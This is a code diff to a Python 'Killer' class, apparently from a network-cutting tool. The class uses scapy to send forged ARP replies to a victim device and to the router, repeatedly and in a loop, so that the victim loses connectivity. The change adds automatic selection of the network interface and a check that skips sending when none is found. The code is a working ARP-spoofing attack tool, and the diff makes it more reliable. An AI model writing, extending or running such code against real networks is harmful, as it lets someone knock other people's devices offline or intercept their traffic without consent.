@@ -1,11 +1,12 @@
 from scapy.all import ARP, send
-from utils import threaded
+from utils import threaded, get_default_iface
 from time import sleep
 
 from constants import *
 
 class Killer:
     def __init__(self, router=DUMMY_ROUTER):
+        self.iface = get_default_iface()
         self.router = router
         self.killed = {}
         self.storage = {}
@@ -39,10 +40,11 @@ class Killer:
 
         print('killed', victim['mac'])
 
-        while victim['mac'] in self.killed:
+        while victim['mac'] in self.killed \
+            and self.iface.name != 'NULL':
             # Send packets to both victim and router
-            send(to_victim, verbose=0)
-            send(to_router, verbose=0)
+            send(to_victim, iface=self.iface.name ,verbose=0)
+            send(to_router, iface=self.iface.name ,verbose=0)
             sleep(wait_after)
 
         print('unkilled', victim['mac'])
@@ -72,9 +74,10 @@ class Killer:
             hwdst=self.router['mac']
         )
 
-        # Send packets to both victim and router
-        send(to_victim, verbose=0)
-        send(to_router, verbose=0)
+        if self.iface.name != 'NULL':
+            # Send packets to both victim and router
+            send(to_victim, iface=self.iface.name ,verbose=0)
+            send(to_router, iface=self.iface.name ,verbose=0)
 
     def kill_all(self, device_list):
         """
